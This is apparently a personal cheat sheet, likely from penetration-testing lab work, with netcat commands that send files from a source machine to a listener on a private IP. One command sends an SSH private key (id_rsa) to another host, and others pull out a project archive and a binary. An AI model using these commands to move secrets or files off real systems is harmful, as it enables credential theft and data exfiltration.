
Destination machine:
`nc -lp 12345 > received_filename.ext`
`nc -lp 12345 > validate`
`timeout 2m nc -lp 1234 > received_filename.ext`

Source machine:
`nc 10.18.21.236 12345 < filename_to_send.ext`
`nc 10.10.14.161 12345 < id_rsa`
`nc 10.10.14.161 12345 < project.zip`
`nc 10.21.31.111 12345 < /usr/local/bin/validate`

check file size to see when finished, then just crtl+c


